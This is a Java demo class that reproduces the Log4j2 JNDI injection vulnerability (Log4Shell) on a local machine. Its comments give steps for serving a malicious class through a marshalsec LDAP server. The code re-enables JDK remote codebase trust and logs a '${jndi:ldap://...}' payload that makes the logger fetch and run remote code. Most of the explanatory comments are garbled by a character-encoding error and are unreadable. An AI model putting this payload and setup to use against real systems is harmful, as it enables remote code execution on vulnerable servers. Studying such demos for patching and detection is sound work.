package xyz.lazyrabbit.log4j2.cve;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author guoxw
 * @Description TODO
 * @createTime 2021��12��28�� 15:47:00
 */
public class CveDemo {

    static Logger logger = LogManager.getLogger(CveDemo.class);

    /**
     * ���ֲ���
     * <p>
     * 1������������OpenCalc.java����class�ļ��ŵ��������ϣ��ṩһ���������ӣ��磺http://127.0.0.1:18080/file/OpenCalc.class
     * 2���LDAP���񣬿���ʹ�ÿ�Դ�ĳ�����https://github.com/mbechler/marshalsec
     * 1����¡����
     * 2��maven�����mvn clean package -DskipTests
     * 3��ִ�У�java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:18080/file/#OpenCalc 1099
     * 3������log4j2 2.15.0�Լ�֮ǰ�İ汾��ִ�б�����
     *
     * @param args
     */
    public static void main(String[] args) {
        // ���ʹ�õͰ汾�� jdk��trustURLCodebase Ĭ�Ͼ��� true������ JNDI ע��©���������� Java �޸��˸�©����������Ĭ��ֵ����Ϊ false��
        // JDK 6u141��7u131��8u121 ֮�������� com.sun.jndi.rmi.object.trustURLCodebase ѡ�Ĭ��Ϊ false����ֹ RMI �� CORBA Э��ʹ��Զ�� codebase ��ѡ���� RMI �� CORBA �����ϵ� JDK �汾���Ѿ��޷�������©��������Ȼ����ͨ��ָ�� URI Ϊ LDAP Э�������� JNDI ע�빥����
        // JDK 6u211��7u201��8u191֮�������� com.sun.jndi.ldap.object.trustURLCodebase ѡ�Ĭ��Ϊ false����ֹ LDAP Э��ʹ��Զ�� codebase ��ѡ��� LDAP Э��Ĺ���;��Ҳ�����ˡ�
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        logger.info("${jndi:ldap://127.0.0.1:1099/OpenCalc}");
    }
}
